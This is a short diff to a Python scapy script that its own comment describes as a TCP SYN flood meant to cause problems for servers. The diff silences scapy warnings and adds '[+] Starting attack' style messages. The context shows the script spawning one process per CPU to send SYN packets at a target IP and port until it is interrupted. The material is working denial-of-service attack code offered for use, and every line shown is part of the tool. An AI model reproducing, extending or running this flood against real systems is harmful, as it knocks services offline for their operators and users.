@@ -1,6 +1,8 @@
 # This is a TCP SYN flood which can cause a problem for servers
 import getopt
 import sys
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 import time
 import multiprocessing
@@ -74,11 +76,12 @@ def main():
 			synSender = Process(name="wearySYNer%i" % (cpus), target=sendSYNs, args=(destinationIp, targetPort, interface))
 			synSender.daemon = True
 			synSender.start()
+		print ("[+] Starting attack...")
 		while True:
 			try:
 				time.sleep(.1)
 			except KeyboardInterrupt:
-				print ("Stopped the attack")
+				print ("[+] Stopped the attack")
 				synSender.terminate()
 				sys.exit(0)
 				quit()
